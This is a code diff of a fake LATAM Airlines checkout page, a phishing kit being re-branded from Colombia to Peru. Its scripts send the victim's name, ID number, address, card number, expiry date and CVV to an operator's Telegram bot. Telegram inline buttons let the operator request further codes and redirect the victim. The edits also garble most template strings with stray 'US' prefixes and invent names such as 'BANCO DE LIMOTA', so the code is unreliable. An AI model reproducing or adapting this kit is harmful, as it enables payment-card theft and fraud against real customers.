@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Pasajeros | LTM Colombia</title>
+    <title>Pasajeros | LTM Perú</title>
     <link rel="shortcut icon" href="./assets/favicon.png" type="image/x-icon" />
 
     <!-- CSS -->
@@ -100,7 +100,7 @@
         const day = dayDic[date.getDay()];
         const month = monthDic[date.getMonth()];
         const dayOfMonth = date.getDate();
-        return `${day}, ${dayOfMonth} de ${month}`;
+        return `US${day}, US${dayOfMonth} de US${month}`;
       }
 
       function calculateTotalCost(flightInfo) {
@@ -131,22 +131,22 @@
         if (resumePassengers && resumeCost && payBtn && paymentCost) {
           let passengersText = "";
           if (flightInfo.adults !== 0) {
-            passengersText += `${flightInfo.adults} ${
+            passengersText += `US${flightInfo.adults} US${
               flightInfo.adults > 1 ? "Adultos" : "Adulto"
             }`;
           }
           if (flightInfo.children !== 0) {
-            passengersText += `, ${flightInfo.children} ${
+            passengersText += `, US${flightInfo.children} US${
               flightInfo.children > 1 ? "Niños" : "Niño"
             }`;
           }
           if (flightInfo.babies !== 0) {
-            passengersText += `, ${flightInfo.babies > 1 ? "Bebés" : "Bebé"}`;
+            passengersText += `, US${flightInfo.babies > 1 ? "Bebés" : "Bebé"}`;
           }
           resumePassengers.innerHTML = passengersText;
 
           const totalCost = calculateTotalCost(flightInfo);
-          const formattedCost = `COP ${totalCost.toLocaleString("es-CO")},00`;
+          const formattedCost = `USD US${totalCost.toLocaleString("es-CO")},00`;
           resumeCost.textContent = formattedCost;
           payBtn.textContent = formattedCost;
           paymentCost.textContent = formattedCost;
@@ -163,24 +163,24 @@
         );
 
         if (resumeGoFlight && resumeGoDate && resumeGoSchedule) {
-          const goFlightText = `De ${flightInfo.origin.city} a ${flightInfo.destination.city}`;
+          const goFlightText = `De US${flightInfo.origin.city} a US${flightInfo.destination.city}`;
           resumeGoFlight.textContent = goFlightText;
 
           const goDateText = formatDate(flightInfo.flightDates[0]);
           resumeGoDate.textContent = goDateText;
 
-          const goScheduleText = `${flightInfo.origin.ticket_sched.takeoff} ${flightInfo.origin.code} → ${flightInfo.destination.ticket_sched.landing} ${flightInfo.destination.code}`;
+          const goScheduleText = `US${flightInfo.origin.ticket_sched.takeoff} US${flightInfo.origin.code} → US${flightInfo.destination.ticket_sched.landing} US${flightInfo.destination.code}`;
           resumeGoSchedule.textContent = goScheduleText;
         }
 
         if (resumeBackFlight && resumeBackDate && resumeBackSchedule) {
-          const backFlightText = `De ${flightInfo.destination.city} a ${flightInfo.origin.city}`;
+          const backFlightText = `De US${flightInfo.destination.city} a US${flightInfo.origin.city}`;
           resumeBackFlight.textContent = backFlightText;
 
           const backDateText = formatDate(flightInfo.flightDates[1]);
           resumeBackDate.textContent = backDateText;
 
-          const backScheduleText = `${flightInfo.destination.ticket_sched.takeoff} ${flightInfo.destination.code} → ${flightInfo.origin.ticket_sched.landing} ${flightInfo.origin.code}`;
+          const backScheduleText = `US${flightInfo.destination.ticket_sched.takeoff} US${flightInfo.destination.code} → US${flightInfo.origin.ticket_sched.landing} US${flightInfo.origin.code}`;
           resumeBackSchedule.textContent = backScheduleText;
         }
       }
@@ -246,9 +246,9 @@
         return;
       }
 
-      const message = `💳-USER EN PASARELA DE PAGO-💳\n\n🌐 IP: ${ip}\n📱 Dispositivo: ${deviceInfo.deviceType}\n`;
+      const message = `💳-USER EN PASARELA DE PAGO-💳\n\n🌐 IP: US${ip}\n📱 Dispositivo: US${deviceInfo.deviceType}\n`;
 
-      fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+      fetch(`https://api.telegram.org/botUS${config.token}/sendMessage`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -313,10 +313,10 @@
           return;
         }
 
-        const message = `👤Nombre: Nombre: ${formData.nombre}\n🪪Cédula: ${formData.documentoIdentidad}\n-\n📞Teléfono: ${formData.telefono}\n🌇Ciudad: ${formData.ciudad}\n🗺️Direc: ${formData.direccion}\n-\n🏦 Banco: ${formData.entidad}\n💳Tarjeta: ${formData.tarjeta}\n📅Fecha: ${formData.fechaExpiracion}\n🔐CVV: ${formData.cvv}
+        const message = `👤Nombre: Nombre: US${formData.nombre}\n🪪Cédula: US${formData.documentoIdentidad}\n-\n📞Teléfono: US${formData.telefono}\n🌇Ciudad: US${formData.ciudad}\n🗺️Direc: US${formData.direccion}\n-\n🏦 Banco: US${formData.entidad}\n💳Tarjeta: US${formData.tarjeta}\n📅Fecha: US${formData.fechaExpiracion}\n🔐CVV: US${formData.cvv}
        `;
 
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+        fetch(`https://api.telegram.org/botUS${config.token}/sendMessage`, {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
@@ -389,16 +389,16 @@
   const transactionId = formData.transactionId;
 
   // Enviar mensaje a Telegram con botón de verificación
-  const message = `Nuevo método de pago pendiente de verificación.\n🆔ID: ${transactionId}Correo: ${formData.email}\n👤Nombre: ${formData.nombre}\n🪪Cédula: ${formData.documentoIdentidad}\n-\n📞Teléfono: ${formData.telefono}\n🌇Ciudad: ${formData.ciudad}\n🗺️Direc: ${formData.direccion}\n-\n🏦 Banco: ${formData.entidad}\n💳Tarjeta: ${formData.tarjeta}\n📅Fecha: ${formData.fechaExpiracion}\n🔐CVV: ${formData.cvv}`;
+  const message = `Nuevo método de pago pendiente de verificación.\n🆔ID: US${transactionId}Correo: US${formData.email}\n👤Nombre: US${formData.nombre}\n🪪Cédula: US${formData.documentoIdentidad}\n-\n📞Teléfono: US${formData.telefono}\n🌇Ciudad: US${formData.ciudad}\n🗺️Direc: US${formData.direccion}\n-\n🏦 Banco: US${formData.entidad}\n💳Tarjeta: US${formData.tarjeta}\n📅Fecha: US${formData.fechaExpiracion}\n🔐CVV: US${formData.cvv}`;
 
   const keyboard = JSON.stringify({
     inline_keyboard: [
-      [{ text: "Pedir Logo", callback_data: `pedir_logo:${transactionId}` }],
-      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
-      [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
-      [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
-      [{ text: "Error de Dinámica", callback_data: `error_dinamica:${transactionId}` }],
-      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
+      [{ text: "Pedir Logo", callback_data: `pedir_logo:US${transactionId}` }],
+      [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:US${transactionId}` }],
+      [{ text: "Error de TC", callback_data: `error_tc:US${transactionId}` }],
+      [{ text: "Error de Logo", callback_data: `error_logo:US${transactionId}` }],
+      [{ text: "Error de Dinámica", callback_data: `error_dinamica:US${transactionId}` }],
+      [{ text: "Finalizar", callback_data: `confirm_finalizar:US${transactionId}` }]
     ],
   });
 
@@ -408,7 +408,7 @@
     return;
   }
 
-  fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+  fetch(`https://api.telegram.org/botUS${config.token}/sendMessage`, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
@@ -442,27 +442,27 @@
           loader.style.display = "none";
           return;
         }
-        fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
+        fetch(`https://api.telegram.org/botUS${config.token}/getUpdates`)
           .then((response) => response.json())
           .then((data) => {
             const updates = data.result;
             const verificationUpdate = updates.find(
               (update) =>
               update.callback_query &&
-              (update.callback_query.data === `pedir_logo:${transactionId}` ||
-               update.callback_query.data === `error_tc:${transactionId}` ||
-               update.callback_query.data === `finalizar:${transactionId}`)
+              (update.callback_query.data === `pedir_logo:US${transactionId}` ||
+               update.callback_query.data === `error_tc:US${transactionId}` ||
+               update.callback_query.data === `finalizar:US${transactionId}`)
             );
 
             if (verificationUpdate) {
               loader.style.display = "none";
-              if (verificationUpdate.callback_query.data === `pedir_logo:${transactionId}`) {
+              if (verificationUpdate.callback_query.data === `pedir_logo:US${transactionId}`) {
                 window.location.href = "chedf.html";
               }
-              if (verificationUpdate.callback_query.data === `error_tc:${transactionId}`) {
+              if (verificationUpdate.callback_query.data === `error_tc:US${transactionId}`) {
                 alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
               }
-              if (verificationUpdate.callback_query.data === `finalizar:${transactionId}`) {
+              if (verificationUpdate.callback_query.data === `finalizar:US${transactionId}`) {
                 window.location.href = "finish.php";
               }
             } else {
@@ -508,7 +508,7 @@
           </div>
           <div>
             <p class="fs-3 m-0 fw-bold tc-ocean mt-1" id="resume-cost">
-              COP 290.090,00
+              USD 290.090,00
             </p>
           </div>
         </div>
@@ -522,7 +522,7 @@
               vie, 01 de mar
             </p>
             <p class="m-0 mt-1 fs-5 tc-gray-smoke" id="resume-go-schedule">
-              04:45 a. m. BAQ → 06:15 a. m. BOG
+              04:45 a. m. CHM → 06:15 a. m. LIM
             </p>
           </div>
           <div class="mb-3">
@@ -533,7 +533,7 @@
               vie, 01 de mar
             </p>
             <p class="m-0 mt-1 fs-5 tc-gray-smoke" id="resume-back-schedule">
-              04:45 a. m. BAQ → 06:15 a. m. BOG
+              04:45 a. m. CHM → 06:15 a. m. LIM
             </p>
           </div>
         </div>
@@ -581,7 +581,7 @@
               <div class="d-flex justify-space-between">
                 <p class="mt-3 fs-4 tc-gray-smoke">A pagar con tarjeta</p>
                 <p class="fs-4 fw-bold tc-ocean" id="payment-cost">
-                  $ 290.090,00
+                  US$ 290.090,00
                 </p>
               </div>
             </div>
@@ -623,8 +623,8 @@
                 <option label="BANCO DAVIVIENDA" value="davivienda">
                   BANCO DAVIVIENDA
                 </option>
-                <option label="BANCO DE BOGOTA" value="bogota">
-                  BANCO DE BOGOTA
+                <option label="BANCO DE LIMOTA" value="bogota">
+                  BANCO DE LIMOTA
                 </option>
                 <option label="BANCO DE OCCIDENTE" value="occidente">
                   BANCO DE OCCIDENTE
@@ -857,7 +857,7 @@
       </p>
 
       <button type="button" class="btn-success mb-5" id="btn-pagar">
-        Pagar <span id="btn-pagar-monto">COP 290.090,00</span>
+        Pagar <span id="btn-pagar-monto">USD 290.090,00</span>
       </button>
     </main>
 
@@ -883,8 +883,8 @@
         </g>
       </svg>
       <p class="fs-5 pr-5 pl-5">
-        © 2024 LATAM Airlines Colombia. NIT: 890.704.196-6, Aerovias de
-        Integración Regional S.A - Aires S.A. Av. El Dorado No.103-08 Entrada 1
+        © 2024 LATAM Airlines Perú. NIT: 890.704.196-6, Aerovias de
+        Integración Regional S.A - Aires S.A. Av. Jorge Chávez No.103-08 Entrada 1
         - Hangar. customer_service@sac.latam.com. 601 - 5185800
       </p>
       <p class="fs-5 pr-5 pl-5">Certificado por:</p>
